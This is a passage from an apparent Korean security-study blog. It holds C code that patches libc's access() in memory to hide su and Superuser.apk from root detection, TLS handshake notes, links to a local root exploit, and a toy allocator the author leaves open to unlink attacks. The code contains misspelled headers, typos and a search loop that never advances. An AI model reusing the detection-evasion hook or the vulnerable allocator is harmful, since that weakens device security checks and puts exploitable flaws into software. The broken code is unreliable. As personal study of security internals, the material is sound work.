</span><span class='line'>#include &lt;fccntl.h&gt;
</span><span class='line'>#include &lt;errono.h&gt;
</span><span class='line'>#include &lt;dlfcn.h&gt;
</span><span class='line'>#include &lt;sys/types.h&gt;
</span><span class='line'>#include &lt;sys/user.h&gt;
</span><span class='line'>#include &lt;sys/mman.h&gt;
</span><span class='line'>#include &lt;sys/syscall.h&gt;
</span><span class='line'>#include &lt;sys/ptrace.h&gt;
</span><span class='line'>#include &lt;sys/wait.h&gt;
</span><span class='line'>#include &lt;linux/user.h&gt;
</span><span class='line'>
</span><span class='line'>#define log(...) fprintf(stdout, __VA_ARGS__)
</span><span class='line'>#define err(...) fprintf(stderr, __VA_ARGS__)
</span><span class='line'>
</span><span class='line'>const unsigned long CPSR_T = 0x00000020u;
</span><span class='line'>
</span><span class='line'>int shim_access(const char * path, int mode)
</span><span class='line'>{
</span><span class='line'>    if (strcmp(path, "/system/app/Superuser.apk") == 0)
</span><span class='line'>        goto err_noent;
</span><span class='line'>    if (strcmp(path, "/system/xbin/su") == 0)
</span><span class='line'>        goto err_noent;
</span><span class='line'>    return syscall(__NR_access, path, mode);
</span><span class='line'>err_noent:
</span><span class='line'>    errno = ENOENT;
</span><span class='line'>    return -1;
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>#if defined(SHARED)
</span><span class='line'>static void __attribute__((constructor)) init()
</span><span class='line'>{
</span><span class='line'>    log("patching access@%@010x with shim@%#010x...\n", (unsigned) &access, (unsigne) &shim_access);
</span><span class='line'>
</span><span class='line'>    uint32_t * src = (uint32_t *) &access;
</span><span class='line'>    uint32_t * dst = (uint32_t *) &shim_access;
</span><span class='line'>
</span><span class='line'>    size_t range = sysconf(_SC_PAGE_SIZE);
</span><span class='line'>    void * page_base = (void *) ((uint32_t) src & ~(range - 1));
</span><span class='line'>    void * page_end = page_base + range;
</span><span class='line'>
</span><span class='line'>    log("reset memory protection for [%#010x, %#010x[...\n", (unsigned) page_base, (unsigned) page_end);
</span><span class='line'>
</span><span class='line'>    if (mprotect(page_base, range, PROT_READ | PROT_WRITE | PROT_EXEC) != 0)
</span><span class='line'>        exit(EXIT_FAILURE);
</span><span class='line'>
</span><span class='line'>    0x0[src] = ( 0xe59f3000); // ldr r3, [pc]
</span><span class='line'>    0x1[src] = ( 0xea000000); // b +4
</span><span class='line'>    0x2[src] = ((uint32_t) dst); // .word dst
</span><span class='line'>    0x3[src] = ( 0xe12fff13); // bx r3
</span><span class='line'>
</span><span class='line'>    if (mprotect(page_base, range, PROT_READ | PROT_EXEC) != 0)
</span><span class='line'>        exit(EXIT_FAILURE);
</span><span class='line'>    
</span><span class='line'>    log("syscall patched!\n");
</span><span class='line'>}
</span><span class='line'>#endif
</span><span class='line'>
</span><span class='line'>static char * get_image_path()
</span><span class='line'>{
</span><span class='line'>    char buffer[1024];
</span><span class='line'>    char * image_path;
</span><span class='line'>    int length; 
</span><span class='line'>
</span><span class='line'>    length = readlink("/proc/self/exe", buffer, sizeof buffer);
</span><span class='line'>    buffer[length] = '\0';
</span><span class='line'>    asprintf(&image_path, "%s", buffer);
</span><span class='line'>    memcpy(&(strlen(image_path) - strlen("rd-patch"))[image_path], "librd.so", strlen("librd.so") + 1);
</span><span class='line'>    return image_path;
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>static void dump_registers(struct user_regs * regs)
</span><span class='line'>{
</span><span class='line'>    log(" r0=%#010lx   r1=%#010lx   r2=%#010lx   r3=%#010lx\n", 0x0[regs-&gt;uregs], 0x1[regs-&gt;uregs], 0x2[regs-&gt;uregs], 0x3[regs-&gt;uregs]);
</span><span class='line'>    log(" r4=%#010lx   r5=%#010lx   r6=%#010lx   r7=%#010lx\n", 0x4[regs-&gt;uregs], 0x5[regs-&gt;uregs], 0x6[regs-&gt;uregs], 0x7[regs-&gt;uregs]);
</span><span class='line'>    log(" r8=%#010lx   r9=%#010lx  r10=%#010lx  r11=%#010lx\n", 0x8[regs-&gt;uregs], 0x9[regs-&gt;uregs], 0xa[regs-&gt;uregs], 0xb[regs-&gt;uregs]);
</span><span class='line'>    log("r12=%#010lx   sp=%#010lx   lr=%#010lx   pc=%#010lx\n", 0xc[regs-&gt;uregs], 0xd[regs-&gt;uregs], 0xe[regs-&gt;uregs], 0xf[regs-&gt;uregs]);
</span><span class='line'>    log("            cpsr=%#010lx\n", 0x10[regs-&gt;uregs]);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/09/tls/">TLS</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-09T13:54:37+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:54 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h4>TLS Data Structures</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>struct {
</span><span class='line'>    uint8 major;
</span><span class='line'>    uint8 minor;
</span><span class='line'>} ProtocolVersion;
</span><span class='line'>
</span><span class='line'>enum {
</span><span class='line'>    change_cipher_spec (20),
</span><span class='line'>    alert (21),
</span><span class='line'>    handshake (22),
</span><span class='line'>    application_data (23)
</span><span class='line'>} ContentType;
</span><span class='line'>
</span><span class='line'>struct {
</span><span class='line'>    ContentType type;
</span><span class='line'>    ProtocolVersion version;
</span><span class='line'>    uint16 length;
</span><span class='line'>    opaque fragment[TLSPlaintext.length];
</span><span class='line'>} TLSPlaintext;
</span><span class='line'>
</span><span class='line'>struct {
</span><span class='line'>    HandshakeType msg_type;
</span><span class='line'>    uint24 length;
</span><span class='line'>    HandshakeMessage message;
</span><span class='line'>} Handshake;</span></code></pre></td></tr></table></div></figure>


<h4>Full Handshake</h4>

<ol>
<li>[ClientHello] Client begins a new handshake and submits its capabilities to the server.</li>
<li>[ServerHello] Sever selects connection parameters.</li>
<li>[Certificate] Server sends its certificate chain (only if server authentication is required).</li>
<li>[ServerKeyExchange] Depending on the selected key exchange, the server sends additional information required to generate the master secret.</li>
<li>[ServerHelloDone] Server indicates completion of its side of the negotiation.</li>
<li>[ClientKeyExchange] Client sends additional information required to generate the master secret.</li>
<li>[ChangeCipherSpec] Client switches to encryption and informs the server.</li>
<li>[Finished] Client sends a MAC of the handshake messages it sent and received.</li>
<li>[ChangeCipherSpec] Server switches to encryption and informs the client.</li>
<li>[Finished] Server sends a MAC of the handshake messages it received and sent.</li>
</ol>


<h4>ClientHello</h4>

<ul>
<li>프로토콜 버전은 클라이언트가 지원하는 가장 높은 버전.</li>
<li>그 다음은 랜덤 28 바이트 + 4 바이트 클락.</li>
<li>첫 연결에서는 세션 ID 는 empty. 리쥼할 경우에는 32 바이트. 서버 세션 캐쉬 ID.</li>
<li>그리고 클라이언트에서 지원하는 cipher suites.</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Handshake protocol: ClientHello
</span><span class='line'>    Version: TLS 1.2
</span><span class='line'>    Random
</span><span class='line'>        Client time: May 22, 2030 02:43:46 GMT
</span><span class='line'>        Random bytes: b76b...
</span><span class='line'>    Session ID: (empty)
</span><span class='line'>    Cipher Suites
</span><span class='line'>        Suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
</span><span class='line'>        Suite: TLS_DHE_RSA_WITH_AES_128_GCM_SHA256
</span><span class='line'>        Suite: TLS_RSA_WITH_AES_128_GCM_SHA256
</span><span class='line'>        ...
</span><span class='line'>    Compression methods
</span><span class='line'>        Method: null
</span><span class='line'>    Extensions
</span><span class='line'>        Extension: server_name
</span><span class='line'>            Hostname: www.babo.com
</span><span class='line'>        Extension: renegotiation_info
</span><span class='line'>        Extension: elliptic_curves
</span><span class='line'>            Named curve: secp256r1
</span><span class='line'>            Named curve: secp384r1
</span><span class='line'>        Extension: signature_algorithms
</span><span class='line'>            Algorithm: sha1/rsa
</span><span class='line'>            Algorithm: sha256/rsa
</span><span class='line'>            Algorithm: sha1/ecdsa
</span><span class='line'>            Algorithm: sha256/ecdsa</span></code></pre></td></tr></table></div></figure>


<h4>ServerHello</h4>

<p>옵션들중에서 서버가 선택한 초이스를 클라이언트에게 알려준다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Handshake protocol: ServerHello
</span><span class='line'>    Version: TLS 1.2
</span><span class='line'>    Random
</span><span class='line'>        Server time: Mar 10, 2059 02:35:57 GMT
</span><span class='line'>        Random bytes: 8469...
</span><span class='line'>    Session ID: 4cae75...
</span><span class='line'>    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
</span><span class='line'>    Compression method: null
</span><span class='line'>    Extensions
</span><span class='line'>        Extension: server_name
</span><span class='line'>        Extension: renegotiation_info</span></code></pre></td></tr></table></div></figure>


<h4>Certificate</h4>

<ul>
<li>서버의 X.509 인증서 체인. ASN.1 DER 인코딩.</li>
<li>서버 인증서가 첫번쨰. 그리고, validation chain 이 주르륵 따라간다. root 는 브라우저에 있으니 생략한다.</li>
<li>선택된 cipher suite 와 호환되는 인증서여야한다.</li>
</ul>


<h4>Finished</h4>

<ul>
<li>verify_data = PRF(master_secret, finished_label, Hash(handshake_message))</li>
</ul>


<h4>Key Exchange</h4>

<ul>
<li>dh_anon, dhe_rsa, ecdh_anon, ecdhe_rsa, ecdhe_ecdsa, krb5, rsa, psk, dhe_psk, rsa_psk, srp</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>struct {
</span><span class='line'>    select (KeyExchangeAlgorithm) {
</span><span class='line'>        case dh_anon:
</span><span class='line'>            ServerDHParams      params;
</span><span class='line'>        case dhe_rsa:
</span><span class='line'>            ServerDHParams      params;
</span><span class='line'>            Signature           params_signature;
</span><span class='line'>        case ecdh_anon:
</span><span class='line'>            ServerECDHParams    params;
</span><span class='line'>        case ecdhe_rsa:
</span><span class='line'>        case ecdhe_ecdsa:
</span><span class='line'>            ServerECDHParams    params;
</span><span class='line'>            Signature           params_signature;
</span><span class='line'>        case rsa:
</span><span class='line'>        case dh_rsa:
</span><span class='line'>            /* no message */
</span><span class='line'>    };
</span><span class='line'>} ServerKeyExchange;</span></code></pre></td></tr></table></div></figure>


<h4>RSA Key Exchange</h4>

<p>굉장히 심플. 클라이언트가 premaster secret (46-byte random number) 를 생성해서, 서버의 public key 로 암호화해서 <code>ClientKeyExchange</code> 메시지로 보낸다. TLS 에서는 <code>RSAES-PKCS1-v1_5</code> 스킴을 사용. Forward secrecy 가 보장이 안되서 문제.</p>

<h4>Diffie-Hellman Key Exchange</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>struct {
</span><span class='line'>    opaque dh_p;
</span><span class='line'>    opaque dh_g;
</span><span class='line'>    opaque dh_Ys;
</span><span class='line'>} ServerDHParams;
</span><span class='line'>
</span><span class='line'>struct {
</span><span class='line'>    select (PublicValueEncoding) {
</span><span class='line'>        case implicit:
</span><span class='line'>            /* empty; used when the client's public parameter is embedded in its certificate */
</span><span class='line'>        case explicit:
</span><span class='line'>            opaque dh_Yc;
</span><span class='line'>    } dh_public;
</span><span class='line'>} ClientDiffieHellmanPublic;</span></code></pre></td></tr></table></div></figure>


<p>Ephemeral Diffie-Hellman (DHE) key exchange 는 파라메터 재사용을 안하는 키교환. 반대로 static DH key exchange 도 있지만, TLS 에서 사용되지는 않는다.</p>

<h4>Elliptic Curve Diffie-Hellman Key Exchange</h4>

<h4>Authentication</h4>

<p>RSA key exchange 에서는 프로토콜을 계속 진행할 수 있다면, 서버가 제시한 인증서의 당사자가 반대편에 있다는 것이 implicit 하게 보장이 된다.</p>

<p>DHE / ECDHE 에서는 서버가 보낸 파라메터에 서명이 딸려온다. 서버의 public key 로 검증할 수 있다.</p>

<h4>Encryption</h4>

<p>Sequence #, Header, Plaintext 를 concat 해서 MAC 을 구해서, Plaintext 에 append 한다. 이 녀석을 encrypt 한 것이 TLS 의 ciphertext. Header + ciphertext 를 전송한다.</p>

<p>Block encryption algorithm 을 사용할 경우 padding 이 들어가는데, Plaintext + MAC + Padding 을 encrypt 하는데, IV 를 generate 한다음에 CBC mode 로 Plaintext + MAC + Padding 을 encrypt 한다. Header + IV + Ciphertext 를 전송한다.</p>

<p>예전에는 전의 ciphertext 를 IV 로 쓰는 chaining 을 했었는데, TLS 1.1 부터 모든 레코드에 IV 가 generate 된다.</p>

<h4>Authenticated Encryption</h4>

<ol>
<li>Generate a unique 64-bit nounce.</li>
<li>Encrypt plaintext with the authenticated encryption algorithm; at the same time feed it the sequence number and record header for it to take into account as additional data for purposes of integrity validation.</li>
<li>Send the nounce and ciphertext together.</li>
</ol>


<p>Authenticated encryption is currently favored as the best encryption mode available in TLS, because it avoids the issues inherent with the MAC-then-encrypt approach.</p>

<h4>PRF</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PRF(secret, label, seed) = P_hash(secret, label + seed)
</span><span class='line'>P_hash(secret, seed) = HMAC_hash(secret, A(1) + seed) + HMAC_hash(secret, A(2) + seed) + ...
</span><span class='line'>A(1) = HMAC_hash(secret, seed)
</span><span class='line'>A(2) = HMAC_hash(secret, A(1))
</span><span class='line'>A(3) = HMAC_hash(secret, A(2))
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<h4>Master Secret</h4>

<p>master_secret = PRF(pre_master_secret, &ldquo;master secret&rdquo;, ClientHello.random + ServerHello.random)</p>

<h4>Key Generation</h4>

<p>key_block = PRF(SecurityParameters.master_secret, &ldquo;key expansion&rdquo;, SecurityParameters.server_random + SecurityParameters.client_random)</p>

<p>The key block is divided into up to six keys: two MAC keys, two encryption keys, two IVs.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/04/28/a-memory-allocator-2/">A Memory Allocator 2</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-04-28T20:49:00+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>28</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:49 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content">
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/04/27/traceroot/">Traceroot</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-04-27T20:36:24+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>27</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:36 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>heap overflow 하는 김에 traceroute heap overflow 를 디벼본다.</p>

<ul>
<li><a href="http://www.giac.org/paper/gcih/133/traceroot-local-root-exploit-red-hat-linux-61-62/100588">traceroot: A Local root Exploit for Red Hat Linux 6.1 and 6.2</a></li>
<li><a href="https://www.exploit-db.com/exploits/20252/">exploit-db</a></li>
</ul>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/04/27/a-memory-allocator/">A Memory Allocator</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-04-27T19:38:35+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>27</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>7:38 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Doug Lea 의 dlmalloc 소스를 보다가 간단하게 하나 만들어 보기로 했다.</p>

<p>find-first-fit 으로 그냥 대충 만들어봤다. <code>unlink()</code> 가 들어있어서, exploit 은 가능한 버전으로.</p>

<p>binning 은 없다. ㅋㅋㅋ <code>sbrk()</code> 로 grow 하지도 않는다. ㅋㅋㅋ</p>

<figure class='code'><figcaption><span>kcmalloc.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define SBRK_UNIT (1024*10)</span>
</span><span class='line'>
</span><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_chunk</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">in_use</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">fd</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">bk</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span> <span class="n">chunk</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define mem2chunk(p) ((void*)(p) - sizeof(chunk))</span>
</span><span class='line'><span class="cp">#define chunk2mem(p) ((void*)(p) + sizeof(chunk))</span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="kt">char</span> <span class="o">*</span><span class="n">_start</span><span class="p">;</span>
</span><span class='line'><span class="k">static</span> <span class="kt">char</span> <span class="o">*</span><span class="n">_end</span><span class="p">;</span>
</span><span class='line'><span class="k">static</span> <span class="kt">char</span> <span class="o">*</span><span class="n">_top</span><span class="p">;</span>
</span><span class='line'><span class="k">static</span> <span class="n">chunk</span> <span class="n">_free</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">kcinit</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">_start</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">sbrk</span><span class="p">(</span><span class="n">SBRK_UNIT</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">_start</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;sbrk faield.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="n">_end</span> <span class="o">=</span> <span class="n">_start</span> <span class="o">+</span> <span class="n">SBRK_UNIT</span><span class="p">;</span>
</span><span class='line'>    <span class="n">_top</span> <span class="o">=</span> <span class="n">_start</span><span class="p">;</span>
</span><span class='line'>    <span class="n">_free</span><span class="p">.</span><span class="n">fd</span> <span class="o">=</span> <span class="n">_free</span><span class="p">.</span><span class="n">bk</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_free</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="kt">void</span> <span class="nf">add_list</span><span class="p">(</span><span class="n">chunk</span> <span class="o">*</span><span class="n">head</span><span class="p">,</span> <span class="n">chunk</span> <span class="o">*</span><span class="n">item</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">chunk</span> <span class="o">*</span><span class="n">tail</span><span class="p">;</span>
</span><span class='line'>    <span class="n">tail</span> <span class="o">=</span> <span class="p">(</span><span class="n">chunk</span><span class="o">*</span><span class="p">)</span><span class="n">head</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
</span><span class='line'>    <span class="n">tail</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">item</span><span class="p">;</span>
</span><span class='line'>    <span class="n">item</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">head</span><span class="p">;</span>
</span><span class='line'>    <span class="n">head</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">item</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">head</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">==</span> <span class="n">head</span><span class="p">)</span>
</span><span class='line'>        <span class="n">head</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">item</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">#define unlink(P,BK,FD) {\</span>
</span><span class='line'><span class="cp">    BK = P-&gt;bk; FD = P-&gt;fd; FD-&gt;bk = BK; BK-&gt;fd = FD; }</span>
</span><span class='line'><span class="n">chunk</span> <span class="o">*</span><span class="nf">find_first_fit</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">alloc_size</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">chunk</span> <span class="o">*</span><span class="n">fd</span><span class="p">;</span>
</span><span class='line'>    <span class="n">chunk</span> <span class="o">*</span><span class="n">bk</span><span class="p">;</span>
</span><span class='line'>    <span class="n">chunk</span> <span class="o">*</span> <span class="n">thru</span><span class="p">;</span>
</span><span class='line'>    <span class="n">thru</span> <span class="o">=</span> <span class="p">(</span><span class="n">chunk</span><span class="o">*</span><span class="p">)</span><span class="n">_free</span><span class="p">.</span><span class="n">fd</span><span class="p">;</span>
</span><span class='line'>    <span class="k">while</span> <span class="p">(</span><span class="n">thru</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">_free</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">alloc_size</span> <span class="o">&lt;=</span> <span class="n">thru</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">unlink</span><span class="p">(</span><span class="n">thru</span><span class="p">,</span> <span class="n">bk</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
</span><span class='line'>            <span class="k">return</span> <span class="n">thru</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="kt">void</span> <span class="o">*</span><span class="nf">kcmalloc</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
</span><span class='line'>    <span class="n">chunk</span> <span class="o">*</span><span class="n">c</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">size_t</span> <span class="n">alloc_size</span><span class="p">;</span>
</span><span class='line'>
